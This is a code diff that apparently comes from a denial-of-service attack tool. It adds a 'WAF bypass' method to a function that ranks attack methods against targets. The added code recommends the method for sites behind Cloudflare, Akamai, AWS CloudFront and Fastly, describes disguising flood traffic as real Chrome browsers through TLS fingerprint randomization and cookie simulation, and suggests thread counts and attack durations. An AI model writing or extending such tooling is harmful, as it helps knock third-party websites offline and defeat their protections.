@@ -231,6 +231,28 @@ function scoreMethodsFor(opts: {
     });
   }
 
+  // ── Geass WAF Bypass ─────────────────────────────────────────────────────
+  // Best against Cloudflare, Akamai, AWS Shield — where direct volume attacks fail
+  if (httpsAvailable && isCDN) {
+    const baseScore = cdnProvider === "Cloudflare" ? 88
+      : cdnProvider === "Akamai" ? 85
+      : cdnProvider === "AWS CloudFront" ? 82
+      : cdnProvider === "Fastly" ? 80
+      : 75;
+
+    recs.push({
+      method:  "waf-bypass",
+      name:    "Geass WAF Bypass",
+      score:   baseScore,
+      tier:    tierFromScore(baseScore),
+      reason:  `${cdnProvider} detected — WAF bypass uses JA3 TLS fingerprint randomization + Chrome-exact HTTP/2 AKAMAI SETTINGS + precise header ordering + CF cookie simulation. Each request appears as a distinct real Chrome browser — indistinguishable from legitimate traffic.`,
+      suggestedThreads:  200,
+      suggestedDuration: 180,
+      protocol:          "HTTP/2",
+      amplification:     1,
+    });
+  }
+
   // ── HTTP/2 Flood ─────────────────────────────────────────────────────────
   if (httpsAvailable) {
     let score = isCDN ? 60 : 82;
